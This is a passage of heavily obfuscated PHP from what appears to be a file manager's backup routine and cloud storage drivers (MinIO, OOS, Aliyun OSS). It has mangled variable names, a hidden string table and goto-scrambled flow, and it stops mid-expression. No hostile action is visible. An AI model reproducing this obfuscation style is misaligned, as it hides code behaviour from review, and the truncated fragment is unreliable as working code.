$dééÇ”Ä—œ = $this->storeIds(); $fíÅ»Ö¯‡ = 1; goto E‚ö„Ñ·®; bšõÑ‘”¯‚: $fÛÖ¥ˆ±ÓÂ = $B¢Ş¹ îó = 0; do { $e‰×ß¿®Óë = $_SERVER[¼€¼ˆ¦‚¡][737]; $bö¯ê§ÇŒ = Model($_SERVER[¼€¼ˆ¦‚¡][715])->where($f®Æ¿ï™Ê¦)->field($e‰×ß¿®Óë)->order($_SERVER[¼€¼ˆ¦‚¡][738])->selectPage($A…«ÃÈ¹¼Ê, $fíÅ»Ö¯‡); $B¢í«‹íÄ¢ = !empty($bö¯ê§ÇŒ[$_SERVER[¼€¼ˆ¦‚¡][354]]) ? $bö¯ê§ÇŒ[$_SERVER[¼€¼ˆ¦‚¡][354]] : array(); foreach ($B¢í«‹íÄ¢ as $AËÒĞ‘İó) { goto fÊ–§„Š; fÊ–§„Š: if (!$this->_fileExist($AËÒĞ‘İó, $cÎË¥×—¦, $dééÇ”Ä—œ)) { $Aíö­Ãš³× -= 1; $cªÂ­Ç£Éç -= (int) $AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][77]]; write_log("\x66\151\154\145\40\156\157\164\x20\x65\x78\x69\x73\164\56\146\x69\x6c\145\111\x44\x3a{$AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][419]]}\x2c\x20\160\x61\x74\x68\x3a{$AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][75]]}", $_SERVER[¼€¼ˆ¦‚¡][739]); continue; } $EØÌ¾…í‘è = $AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][75]]; $BÒ§ôóÎšæ = "\173\x69\157\72{$EìÜ‚Ûª—ƒ[$_SERVER[¼€¼ˆ¦‚¡][687]]}\x7d" . substr($EØÌ¾…í‘è, strlen("\173\151\157\x3a{$AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][740]]}\x7d")); goto Dƒ¹ŸÃïĞ¥; Dƒ¹ŸÃïĞ¥: if (IO::exist($BÒ§ôóÎšæ)) { $eÚ¯„Á¨ÀÇ->updateFileEnd($AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][28]], $AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][77]]); } else { $BÒ§ôóÎšæ = get_path_father($BÒ§ôóÎšæ); IO::mkdir($BÒ§ôóÎšæ); if (!IO::copy($EØÌ¾…í‘è, $BÒ§ôóÎšæ, $_SERVER[¼€¼ˆ¦‚¡][741])) { write_log($_SERVER[¼€¼ˆ¦‚¡][742] . $EØÌ¾…í‘è . $_SERVER[¼€¼ˆ¦‚¡][743] . $BÒ§ôóÎšæ . $_SERVER[¼€¼ˆ¦‚¡][476], $_SERVER[¼€¼ˆ¦‚¡][710]); $fÆ´¡‚¼Ó = !1; break; } } $dÌÒ‰ºöÊ = $AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][419]]; $DÁÑà˜„­â += 1; goto E“ÛÖâë¹; E“ÛÖâë¹: $eœõ’ÀêÉÛ += $AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][77]]; $B¢Ş¹ îó += 1; $fÛÖ¥ˆ±ÓÂ += $AËÒĞ‘İó[$_SERVER[¼€¼ˆ¦‚¡][77]]; goto DÄó¿Ü¢õ«; DÄó¿Ü¢õ«: if ($eœõ’ÀêÉÛ >= 1024 * 1024 * 100) { $C£¯¶¢Ô¶” = array($_SERVER[¼€¼ˆ¦‚¡][744] => $dÌÒ‰ºöÊ, $_SERVER[¼€¼ˆ¦‚¡][745] => $B¢Ş¹ îó, $_SERVER[¼€¼ˆ¦‚¡][746] => $fÛÖ¥ˆ±ÓÂ); Backup::set($C£¯¶¢Ô¶”); $eœõ’ÀêÉÛ = $DÁÑà˜„­â = 0; } goto E›ˆŠ¾ÍÓù; E›ˆŠ¾ÍÓù: } $EÅ“’†»Œ = count($B¢í«‹íÄ¢); $fíÅ»Ö¯‡++; } while ($EÅ“’†»Œ == $A…«ÃÈ¹¼Ê); $eÚ¯„Á¨ÀÇ->end(); goto fµŠ‚øŒÏğ; AŠÃÚéã…‰: Backup::set($C£¯¶¢Ô¶”); $this->_fileFilter($cÎË¥×—¦); return !0; goto fáÖÂÀ˜Ñ; fáÖÂÀ˜Ñ: } private function _fileExist($DÖëĞ©ƒ¼ó, &$fÄÚËñÕØà, $a¹º¹Š…“à) { goto EĞÎ°öØ‹­; fËãÏà¯´­: if (IO::exist($aªª°Â¤ë¥)) { $fÄÚËñÕØà[] = $DÖëĞ©ƒ¼ó[$BÍ®Ä•ä©[419]]; return !1; } $f¯îù¹Ç… = array($BÍ®Ä•ä©[740] => $DÖëĞ©ƒ¼ó[$BÍ®Ä•ä©[740]], $BÍ®Ä•ä©[75] => array($BÍ®Ä•ä©[748], "{$aªª°Â¤ë¥}\45")); $e›èÏ“¨çá = Model($BÍ®Ä•ä©[715])->where($f¯îù¹Ç…)->field($BÍ®Ä•ä©[420])->select(); goto fÜ½ë‹ÁÄÖ; fÜ½ë‹ÁÄÖ: $fÄÚËñÕØà = array_merge($fÄÚËñÕØà, array_to_keyvalue($e›èÏ“¨çá, $BÍ®Ä•ä©[33], $BÍ®Ä•ä©[419])); return !1; goto C‡’±Şóè; EĞÎ°öØ‹­: $BÍ®Ä•ä© =& $_SERVER[¼€¼ˆ¦‚¡]; $c®ôÅ¢Ò’˜ = $DÖëĞ©ƒ¼ó[$BÍ®Ä•ä©[75]]; if (in_array($DÖëĞ©ƒ¼ó[$BÍ®Ä•ä©[419]], $fÄÚËñÕØà)) { return !1; } goto FÂ‚è¶Íå; FÂ‚è¶Íå: if (!in_array($DÖëĞ©ƒ¼ó[$BÍ®Ä•ä©[740]], $a¹º¹Š…“à)) { return !1; } if (IO::exist($c®ôÅ¢Ò’˜)) { return !0; } $aªª°Â¤ë¥ = get_path_father($c®ôÅ¢Ò’˜); goto fËãÏà¯´­; C‡’±Şóè: } private function _fileFilter($BàŒËò³‡) { $eŠöøƒìÈÒ =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($BàŒËò³‡)) { return; } $Aè®’°âîˆ = array($eŠöøƒìÈÒ[419] => array($eŠöøƒìÈÒ[7], array_unique($BàŒËò³‡))); $EÁóÉ¡÷Ó = Model($eŠöøƒìÈÒ[749])->where($Aè®’°âîˆ)->field($eŠöøƒìÈÒ[369])->select(); foreach ($EÁóÉ¡÷Ó as $a„ÑÊâ¯É¹) { Model($eŠöøƒìÈÒ[749])->remove($a„ÑÊâ¯É¹[$eŠöøƒìÈÒ[369]], !1); } } private function storeIds() { $eÄÏ™ç¯ë =& $_SERVER[¼€¼ˆ¦‚¡]; $B—É»šÌÎ = Model($eÄÏ™ç¯ë[700])->listData(); $cä’îˆç¯ = array(); $AÛˆƒó¹• = $GLOBALS[$eÄÏ™ç¯ë[6]][$eÄÏ™ç¯ë[84]][$eÄÏ™ç¯ë[750]]; foreach ($B—É»šÌÎ as $AÊÕ Õ˜â) { $e—¼İ”ö•ƒ = strtolower($AÊÕ Õ˜â[$eÄÏ™ç¯ë[90]]); if (!isset($AÛˆƒó¹•[$e—¼İ”ö•ƒ])) { continue; } $BÅ»£“›Õ„ = $eÄÏ™ç¯ë[71] . (isset($AÛˆƒó¹•[$e—¼İ”ö•ƒ]) ? $AÛˆƒó¹•[$e—¼İ”ö•ƒ] : ucfirst($e—¼İ”ö•ƒ)); if (!class_exists($BÅ»£“›Õ„)) { continue; } $cä’îˆç¯[] = $AÊÕ Õ˜â[$eÄÏ™ç¯ë[367]]; } return $cä’îˆç¯; } } goto cè †Á ºŸ; A¹ÓÚĞõ–Í: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($aò™˜”†¾) { parent::__construct($aò™˜”†¾); $this->signatureVersion($_SERVER[¼€¼ˆ¦‚¡][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($aòèô¼†‡è) { parent::__construct($aòèô¼†‡è); $this->signatureVersion($_SERVER[¼€¼ˆ¦‚¡][200]); } public function fileOutLink($cÔ£³ÃÏ¦×) { $b‰œãË¦Ù =& $_SERVER[¼€¼ˆ¦‚¡]; if (substr($cÔ£³ÃÏ¦×, 0, 7) == $b‰œãË¦Ù[1115]) { $cÔ£³ÃÏ¦× = $b‰œãË¦Ù[1116] . substr($cÔ£³ÃÏ¦×, 7); } header($b‰œãË¦Ù[156] . $cÔ£³ÃÏ¦×); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Dãî»‰Òî) { parent::__construct(); include_once SDK_DIR . $_SERVER[¼€¼ˆ¦‚¡][1171]; $this->_init($Dãî»‰Òî); } public function _init($AØ¸µ‰) { foreach ($AØ¸µ‰ as $d®áœêõÆñ => $Fà†ÓĞô¦) { if (isset($this->{$d®áœêõÆñ})) { $this->{$d®áœêõÆñ} = $Fà†ÓĞô¦; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¼€¼ˆ¦‚¡][1172], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto a¹ ‡Ü¦Ä—; a¹ ‡Ü¦Ä—: $eì³³¶ËŸ‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $Eƒµ·±ÂÒ = new OSS\Model\CorsConfig(); $dÃøîĞ¶° = new OSS\Model\CorsRule(); goto a¯˜Ë—Öé½; a¯˜Ë—Öé½: $dÃøîĞ¶°->addAllowedOrigin($eì³³¶ËŸ‰[1173]); $dÃøîĞ¶°->addAllowedMethod($eì³³¶ËŸ‰[1174]); $dÃøîĞ¶°->addAllowedMethod($eì³³¶ËŸ‰[1175]); goto F³ÙÄ½ç; Cóˆäë‹°â: $dÃøîĞ¶°->setMaxAgeSeconds(600); $dÃøîĞ¶°->addExposeHeader($eì³³¶ËŸ‰[1178]); $dÃøîĞ¶°->addAllowedHeader($eì³³¶ËŸ‰[1173]); goto B…°Æö•í; B…°Æö•í: $Eƒµ·±ÂÒ->addRule($dÃøîĞ¶°); try { $this->client->putBucketCors($this->bucket, $Eƒµ·±ÂÒ); } catch (OSS\Core\OssException $fğæÔ­……±) { return !1; } return !0; goto aĞÇìÈ±ïÚ; F³ÙÄ½ç: $dÃøîĞ¶°->addAllowedMethod($eì³³¶ËŸ‰[1176]); $dÃøîĞ¶°->addAllowedMethod($eì³³¶ËŸ‰[1177]); $dÃøîĞ¶°->addAllowedMethod($eì³³¶ËŸ‰[155]); goto Cóˆäë‹°â; aĞÇìÈ±ïÚ: } public function getBucketCors() { goto e£ ÍÁ±; e£ ÍÁ±: $b•¥×Û”åÖ =& $_SERVER[¼€¼ˆ¦‚¡]; $bÔ•ê˜¡Çª = null; try { $bÔ•ê˜¡Çª = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $b»¨Ğí´Ñ¸) { return null; } goto eãçÇˆˆ¹‹; BÂîÍæª¢: $Eãİã×½…Ì = $A±¡ÓÚ¹Ó¼[0]->getMaxAgeSeconds(); $fÀ£âéÁî‹ = $A±¡ÓÚ¹Ó¼[0]->getExposeHeaders(); $A‰çËæ«õœ = $A±¡ÓÚ¹Ó¼[0]->getAllowedHeaders(); goto DóˆˆÏÏ¢Š; DóˆˆÏÏ¢Š: return array($b•¥×Û”åÖ[175] => isset($FßÄ†™¿„Œ[0]) ? $FßÄ†™¿„Œ[0] : $b•¥×Û”åÖ[33], $b•¥×Û”åÖ[179] => $fùßˆ¹ë¹¹, $b•¥×Û”åÖ[1179] => $Eãİã×½…Ì, $b•¥×Û”åÖ[1180] => isset($fÀ£âéÁî‹[0]) ? $fÀ£âéÁî‹[0] : $b•¥×Û”åÖ[33], $b•¥×Û”åÖ[177] => isset($A‰çËæ«õœ[0]) ? $A‰çËæ«õœ[0] : $b•¥×Û”åÖ[33]); goto Aõ¬ÇØµÓÚ; eãçÇˆˆ¹‹: if (!$bÔ•ê˜¡Çª || !($A±¡ÓÚ¹Ó¼ = $bÔ•ê˜¡Çª->getRules())) { return null; } $FßÄ†™¿„Œ = $A±¡ÓÚ¹Ó¼[0]->getAllowedOrigins(); $fùßˆ¹ë¹¹ = $A±¡ÓÚ¹Ó¼[0]->getAllowedMethods(); goto BÂîÍæª¢; Aõ¬ÇØµÓÚ: } public function isBucketCors() { goto EÂ½Í†áŒì; FÛğŞÌÏÁõ: if ($f¡‘¡İšñ[$F·ääºæİ [175]] != $F·ääºæİ [176] || $f¡‘¡İšñ[$F·ääºæİ [177]] != $F·ääºæİ [176]) { return !1; } $dùÓİİï…¾ = array_map($F·ääºæİ [178], $f¡‘¡İšñ[$F·ääºæİ [179]]); if (!is_array($dùÓİİï…¾)) { $dùÓİİï…¾ = array(); } goto bÈ¨‚Ó¸Œ; EÂ½Í†áŒì: $F·ääºæİ  =& $_SERVER[¼€¼ˆ¦‚¡]; $f¡‘¡İšñ = $this->getBucketCors(); if (!$f¡‘¡İšñ || !is_array($f¡‘¡İšñ)) { return !1; } goto FÛğŞÌÏÁõ; bÈ¨‚Ó¸Œ: $e°óÃ›ÒÊ™ = array($F·ääºæİ [180], $F·ääºæİ [181], $F·ääºæİ [182], $F·ääºæİ [183], $F·ääºæİ [184]); $eóí° ±òõ = array_diff($e°óÃ›ÒÊ™, $dùÓİİï…¾); return empty($eóí° ±òõ); goto AÊÀÃËõÇ; AÊÀÃËõÇ: } public function mkfile($dŠ‘Œ–ù²´, $E®æôµóÒç = '', $Få¦À¶± = REPEAT_RENAME) { $A¨å‘ğ¡å = $this->setContent($dŠ‘Œ–ù²´, $E®æôµóÒç); if ($A¨å‘ğ¡å !== !1) { return $this->getPathOuter($dŠ‘Œ–ù²´); } return !1; } public function mkdir($dâïŞÏºÍ³, $b™ó‘‰Êãã = REPEAT_SKIP) { if ($this->_isFolder($dâïŞÏºÍ³)) { return $this->getPathOuter($dâïŞÏºÍ³); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($dâïŞÏºÍ³)); } catch (OSS\Core\OssException $cù“—¾íµ‰) { return !1; } return $this->getPathOuter($dâïŞÏºÍ³); } private function fileList($E‹‡Í§×ëˆ, $aÈÂß ­Ÿ = '', $b¦éÈ²Âä¬ = 0) { goto EÉº™¸µ…; cèò ¸Öé: while (!0) { $CâŸ®—à„ = array($Dòèøå–ë‘[1181] => $aÈÂß ­Ÿ, $Dòèøå–ë‘[186] => $e„À™÷íÊ, $Dòèøå–ë‘[1182] => $a¦‰‡è ‡°, $Dòèøå–ë‘[1183] => $CÃ—»ë™Ã“); try { $Eá°æ¹ÁÚÓ = $this->client->listObjects($this->bucket, $CâŸ®—à„); } catch (OSS\Core\OssException $fÔÈóà™À) { break; } $CÃ—»ë™Ã“ = $Eá°æ¹ÁÚÓ->getNextMarker(); $AÜŸöË¹Ïö = $Eá°æ¹ÁÚÓ->getObjectList(); $eÂŠˆ×¸ìê = $Eá°æ¹ÁÚÓ->getPrefixList(); foreach ($AÜŸöË¹Ïö as $A¤‘Æ„‚ˆ‹) { if ($A¤‘Æ„‚ˆ‹->getKey() == $e„À™÷íÊ) { continue; } $d¯âÜ–¸£ = $A¤‘Æ„‚ˆ‹->getKey(); if ($b¦éÈ²Âä¬) { $d¯âÜ–¸£ = array($Dòèøå–ë‘[28] => $d¯âÜ–¸£, $Dòèøå–ë‘[77] => $A¤‘Æ„‚ˆ‹->getSize(), $Dòèøå–ë‘[190] => strtotime($A¤‘Æ„‚ˆ‹->getLastModified())); } $c”÷”§ßÖÖ[] = $d¯âÜ–¸£; } foreach ($eÂŠˆ×¸ìê as $c¿Ô‹ì“¡¥) { $EÜ„Ì¦×[] = $c¿Ô‹ì“¡¥->getPrefix(); } if ($CÃ—»ë™Ã“ === $Dòèøå–ë‘[33]) { break; } } return array($Dòèøå–ë‘[74] => $EÜ„Ì¦×, $Dòèøå–ë‘[73] => $c”÷”§ßÖÖ); goto FŠºà³”‰; EÉº™¸µ…: $Dòèøå–ë‘ =& $_SERVER[¼€¼ˆ¦‚¡]; $E‹‡Í§×ëˆ = trim($E‹‡Í§×ëˆ, $Dòèøå–ë‘[8]); $e„À™÷íÊ = empty($E‹‡Í§×ëˆ) ? $Dòèøå–ë‘[33] : $E‹‡Í§×ëˆ . $Dòèøå–ë‘[8]; goto A¶ÂîÂâ©ã; A¶ÂîÂâ©ã: $CÃ—»ë™Ã“ = $Dòèøå–ë‘[33]; $a¦‰‡è ‡° = 1000; $EÜ„Ì¦× = $c”÷”§ßÖÖ = array(); goto cèò ¸Öé; FŠºà³”‰: } public function copyFile($DÆ’‡¡æ¡, $e¶Ñº¢ù˜) { $fÓ©ƒ„ï = $this->size($DÆ’‡¡æ¡); if ($fÓ©ƒ„ï < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $DÆ’‡¡æ¡, $this->bucket, $this->pathEncode($e¶Ñº¢ù˜)); } catch (OSS\Core\OssException $c´ÎÈĞÖöì) { return !1; } return $this->getPathOuter($e¶Ñº¢ù˜); } $CâÂå¢æÉ = $this->multiCopyObject($DÆ’‡¡æ¡, $e¶Ñº¢ù˜, $fÓ©ƒ„ï); return $CâÂå¢æÉ ? $this->getPathOuter($e¶Ñº¢ù˜) : !1; } private function multiCopyObject($F‰º‘ÊŒŞå, $aíËÎ‡—š÷, $e´•Ö“ÛÎ) { $fˆÊ©å¡Ó– =& $_SERVER[¼€¼ˆ¦‚¡]; try { goto DœË­¿ªÙë; cß·††¶Ôµ: $eŠÕÅ®±± = 1; $E¥‰¨ÒÇã = 0; $f…›ŞˆÃªÄ = array(); goto DºÓ‹™»·; aåÛÛ¡ö¿Î: $e¢Ê³Ëƒë¦ = array(); foreach ($f…›ŞˆÃªÄ as $CĞÎÑèó¸ => $A°„šçÉãÜ) { $e¢Ê³Ëƒë¦[] = array($fˆÊ©å¡Ó–[1188] => $CĞÎÑèó¸ + 1, $fˆÊ©å¡Ó–[1189] => $A°„šçÉãÜ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($aíËÎ‡—š÷), $CØùŠšª…, $e¢Ê³Ëƒë¦); goto b‡’¢âÂº; DºÓ‹™»·: $F—á«è­„ = 1024 * 1024 * 10; $eŞÅË‚Õé = $this->client->generateMultiuploadParts($e´•Ö“ÛÎ, $F—á«è­„); foreach ($eŞÅË‚Õé as $CĞÎÑèó¸ => $f¥÷´Š’ô‘) { $Aùà»ÀÒ«³ = $E¥‰¨ÒÇã + (int) $f¥÷´Š’ô‘[$fˆÊ©å¡Ó–[1185]]; $DºÂ×ÑÔ = (int) $f¥÷´Š’ô‘[$fˆÊ©å¡Ó–[325]] + $Aùà»ÀÒ«³ - 1; $dŸí¿±Ÿ = array($fˆÊ©å¡Ó–[1186] => $Aùà»ÀÒ«³, $fˆÊ©å¡Ó–[1187] => $DºÂ×ÑÔ); $f…›ŞˆÃªÄ[] = $this->client->uploadPartCopy($this->bucket, $F‰º‘ÊŒŞå, $this->bucket, $this->pathEncode($aíËÎ‡—š÷), $eŠÕÅ®±±, $CØùŠšª…, $dŸí¿±Ÿ); $eŠÕÅ®±± = $eŠÕÅ®±± + 1; } goto aåÛÛ¡ö¿Î; DœË­¿ªÙë: $EÊ±¡Ñ÷¼ì = array(); if ($e…‰¾‚ğÙŞ = $this->hashMd5($F‰º‘ÊŒŞå)) { $EÊ±¡Ñ÷¼ì = array(OSS\OssClient::OSS_HEADERS => array($fˆÊ©å¡Ó–[1184] => $e…‰¾‚ğÙŞ)); } $CØùŠšª… = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aíËÎ‡—š÷), $EÊ±¡Ñ÷¼ì); goto cß·††¶Ôµ; b‡’¢âÂº: } catch (OSS\Core\OssException $aî¼­ã÷ê±) { return !1; } return !0; } public function moveFile($eä‹õš¯¯Ì, $cãÍ¾‚ÈƒŒ) { if ($this->copyFile($eä‹õš¯¯Ì, $cãÍ¾‚ÈƒŒ)) { $this->remove($eä‹õš¯¯Ì); return $this->getPathOuter($cãÍ¾‚ÈƒŒ); } return !1; } public function delFile($F³æÃÍÂÔ¶) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($F³æÃÍÂÔ¶)); } catch (OSS\Core\OssException $c™Ë¢²õ) { return !1; } return !0; } public function delFolder($Bøé­©•ÎŠ) { $cã‰í·íğÖ =& $_SERVER[¼€¼ˆ¦‚¡]; $aà‘Á¹¹÷ö = $this->fileList($Bøé­©•ÎŠ); if (!empty($Bøé­©•ÎŠ) && !in_array(trim($Bøé­©•ÎŠ, $cã‰í·íğÖ[8]) . $cã‰í·íğÖ[8], $aà‘Á¹¹÷ö[$cã‰í·íğÖ[73]])) { $aà‘Á¹¹÷ö[$cã‰í·íğÖ[73]][] = trim($Bøé­©•ÎŠ, $cã‰í·íğÖ[8]) . $cã‰í·íğÖ[8]; } foreach (array_chunk($aà‘Á¹¹÷ö[$cã‰í·íğÖ[73]], 1000) as $F¥Õã±ª£) { try { $this->client->deleteObjects($this->bucket, $F¥Õã±ª£); } catch (OSS\Core\OssException $ağé°²ªáÊ) { continue; } } return !0; } public function rename($Fèš‹á­¬, $EÚÃ˜ƒİ) { return $this->renameObject($Fèš‹á­¬, $EÚÃ˜ƒİ); } private function fileInfo($eĞ÷¯ÆÈ²¢, $bêñĞ†‘§ã = array()) { goto c¸ñå˜‚ßà; c¸ñå˜‚ßà: $E‡ïÆ…İá‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $EŠ…Îš¦® = array($E‡ïÆ…İá‹[28] => $this->pathThis($eĞ÷¯ÆÈ²¢), $E‡ïÆ…İá‹[75] => $this->getPathOuter($eĞ÷¯ÆÈ²¢), $E‡ïÆ…İá‹[29] => $E‡ïÆ…İá‹[167], $E‡ïÆ…İá‹[187] => 0, $E‡ïÆ…İá‹[107] => 0, $E‡ïÆ…İá‹[77] => 0, $E‡ïÆ…İá‹[160] => $this->ext($eĞ÷¯ÆÈ²¢), $E‡ïÆ…İá‹[188] => !0, $E‡ïÆ…İá‹[189] => !0); if (empty($bêñĞ†‘§ã)) { $D¿¬¯„Ú‹Œ = $this->objectMeta($eĞ÷¯ÆÈ²¢); if (!$D¿¬¯„Ú‹Œ) { return $EŠ…Îš¦®; } $bêñĞ†‘§ã = array($E‡ïÆ…İá‹[107] => strtotime($D¿¬¯„Ú‹Œ[$E‡ïÆ…İá‹[1190]]), $E‡ïÆ…İá‹[77] => $D¿¬¯„Ú‹Œ[$E‡ïÆ…İá‹[1191]] + 0); } goto cÔÜÇ¦åø¸; CñÅâÀ¢Úƒ: return $EŠ…Îš¦®; goto aå¿×†¢Ö; cÔÜÇ¦åø¸: if (isset($bêñĞ†‘§ã[$E‡ïÆ…İá‹[77]])) { $EŠ…Îš¦®[$E‡ïÆ…İá‹[77]] = $bêñĞ†‘§ã[$E‡ïÆ…İá‹[77]]; } if (isset($bêñĞ†‘§ã[$E‡ïÆ…İá‹[107]])) { $EŠ…Îš¦®[$E‡ïÆ…İá‹[107]] = $bêñĞ†‘§ã[$E‡ïÆ…İá‹[107]]; } if (isset($bêñĞ†‘§ã[$E‡ïÆ…İá‹[190]]) && !trim($EŠ…Îš¦®[$E‡ïÆ…İá‹[107]])) { $EŠ…Îš¦®[$E‡ïÆ…İá‹[107]] = $bêñĞ†‘§ã[$E‡ïÆ…İá‹[190]]; } goto CñÅâÀ¢Úƒ; aå¿×†¢Ö: } private function folderInfo($aÆÉ¯œµ´”, $A¹ÆŒò“„ = array()) { $eÑÏâ÷ =& $_SERVER[¼€¼ˆ¦‚¡]; $DŒòÅøî’‹ = array($eÑÏâ÷[28] => $this->pathThis($aÆÉ¯œµ´”), $eÑÏâ÷[75] => $this->getPathOuter($eÑÏâ÷[8] . $aÆÉ¯œµ´”), $eÑÏâ÷[29] => $eÑÏâ÷[76], $eÑÏâ÷[187] => 0, $eÑÏâ÷[107] => 0, $eÑÏâ÷[188] => !0, $eÑÏâ÷[189] => !0); if (empty($A¹ÆŒò“„)) { $aÆÉ¯œµ´” = rtrim($aÆÉ¯œµ´”, $eÑÏâ÷[8]) . $eÑÏâ÷[8]; $Aá°„îù˜ = $this->objectMeta($aÆÉ¯œµ´”); if (!$Aá°„îù˜) { return $DŒòÅøî’‹; } $A¹ÆŒò“„ = array($eÑÏâ÷[187] => $Aá°„îù˜[$eÑÏâ÷[1192]][$eÑÏâ÷[1193]], $eÑÏâ÷[107] => strtotime($Aá°„îù˜[$eÑÏâ÷[1190]])); } if (isset($A¹ÆŒò“„[$eÑÏâ÷[107]])) { $DŒòÅøî’‹[$eÑÏâ÷[107]] = $A¹ÆŒò“„[$eÑÏâ÷[107]]; } if (isset($A¹ÆŒò“„[$eÑÏâ÷[187]])) { $DŒòÅøî’‹[$eÑÏâ÷[187]] = $A¹ÆŒò“„[$eÑÏâ÷[187]]; } return $DŒòÅøî’‹; } public function listPath($B¿×Â®ó‡Ö, $cßŸÀ½’¶ = false) { $DÓæ°Ã§Œ¬ =& $_SERVER[¼€¼ˆ¦‚¡]; $DÍ¤ù•ôó = $this->fileList($B¿×Â®ó‡Ö, $DÓæ°Ã§Œ¬[8], !0); foreach ($DÍ¤ù•ôó[$DÓæ°Ã§Œ¬[74]] as $DƒĞ“¸ŸÅ => $aÚßğ¢è¶) { $DÍ¤ù•ôó[$DÓæ°Ã§Œ¬[74]][$DƒĞ“¸ŸÅ] = $this->folderInfo($aÚßğ¢è¶, $aÚßğ¢è¶); } foreach ($DÍ¤ù•ôó[$DÓæ°Ã§Œ¬[73]] as $DƒĞ“¸ŸÅ => $aÚßğ¢è¶) { $DÍ¤ù•ôó[$DÓæ°Ã§Œ¬[73]][$DƒĞ“¸ŸÅ] = $this->fileInfo($aÚßğ¢è¶[$DÓæ°Ã§Œ¬[28]], $aÚßğ¢è¶); } return $DÍ¤ù•ôó; } public function has($C…™£‡½Ä¡, $c± »æ±¬á = false, $EÛÔÍõÁ¦ = true) { goto eçÌ‘ê¤Ñ; C«ÊöìÊçÊ: $D˜‘‚ÜÃˆĞ = $Då‹Æ¸ŠÕ[33]; $E„ÓêÒé³„ = 500; $b˜š”Ó¾Áá = 0; goto cÈèä‘…Ë; eçÌ‘ê¤Ñ: $Då‹Æ¸ŠÕ =& $_SERVER[¼€¼ˆ¦‚¡]; $C…™£‡½Ä¡ = trim($C…™£‡½Ä¡, $Då‹Æ¸ŠÕ[8]); $EóİÑ“£Ó = empty($C…™£‡½Ä¡) ? $Då‹Æ¸ŠÕ[33] : $C…™£‡½Ä¡ . $Då‹Æ¸ŠÕ[8]; goto C«ÊöìÊçÊ; AÏ°³«Œ ‹: return !1; goto BÍÔ¹‰èÚ; cÈèä‘…Ë: $d¬»…Çô‰ö = 0; while (!0) { $a‡ÚÓÇĞ¼‡ = array($Då‹Æ¸ŠÕ[1181] => $Då‹Æ¸ŠÕ[8], $Då‹Æ¸ŠÕ[186] => $EóİÑ“£Ó, $Då‹Æ¸ŠÕ[1182] => $E„ÓêÒé³„, $Då‹Æ¸ŠÕ[1183] => $D˜‘‚ÜÃˆĞ); try { $F‘¤ˆ‡Šø = $this->client->listObjects($this->bucket, $a‡ÚÓÇĞ¼‡); } catch (OSS\Core\OssException $cóŠîÅ½”“) { break; } $D˜‘‚ÜÃˆĞ = $F‘¤ˆ‡Šø->getNextMarker(); $bƒÏ¢î£øĞ = $F‘¤ˆ‡Šø->getObjectList(); $bœ¦èä‚ÈŞ = $F‘¤ˆ‡Šø->getPrefixList(); if ($c± »æ±¬á) { if (count($bƒÏ¢î£øĞ) > 1 || count($bƒÏ¢î£øĞ) == 1 && $bƒÏ¢î£øĞ[0]->getKey() != $EóİÑ“£Ó) { $b˜š”Ó¾Áá += count($bƒÏ¢î£øĞ) - 1; } if (!empty($bœ¦èä‚ÈŞ)) { $d¬»…Çô‰ö += count($bœ¦èä‚ÈŞ); } if ($D˜‘‚ÜÃˆĞ === $Då‹Æ¸ŠÕ[33]) { break; } continue; } if ($EÛÔÍõÁ¦) { if (!empty($bƒÏ¢î£øĞ)) { if (count($bƒÏ¢î£øĞ) > 1 || $bƒÏ¢î£øĞ[0]->getKey() != $EóİÑ“£Ó) { return !0; } } } else { if (!empty($bœ¦èä‚ÈŞ)) { return !0; } } if ($D˜‘‚ÜÃˆĞ === $Då‹Æ¸ŠÕ[33]) { break; } } if ($c± »æ±¬á) { return array($Då‹Æ¸ŠÕ[191] => $b˜š”Ó¾Áá, $Då‹Æ¸ŠÕ[192] => $d¬»…Çô‰ö); } goto AÏ°³«Œ ‹; BÍÔ¹‰èÚ: } public function listAll($Aóø¤ª õ) { $d»œéº¥Ç =& $_SERVER[¼€¼ˆ¦‚¡]; $aÑ¯ÁÂò‚¯ = $this->fileList($Aóø¤ª õ, $d»œéº¥Ç[33], !0); $cÏ¸ßÅµ”÷ = array(); foreach ($aÑ¯ÁÂò‚¯[$d»œéº¥Ç[73]] as $e‡á¯·æ„–) { $cÏ¸ßÅµ”÷[$e‡á¯·æ„–[$d»œéº¥Ç[28]]] = $e‡á¯·æ„–[$d»œéº¥Ç[77]]; } return $this->listAllFiles($Aóø¤ª õ, array_keys($cÏ¸ßÅµ”÷), $cÏ¸ßÅµ”÷); } public function canRead($cÌ´¸ïÌÆÂ) { $e¬ø†ã¢¦é =& $_SERVER[¼€¼ˆ¦‚¡]; $CÒ¸‚Ììßá = $this->pathAcl($cÌ´¸ïÌÆÂ); return $CÒ¸‚Ììßá == $e¬ø†ã¢¦é[1194] || $CÒ¸‚Ììßá == 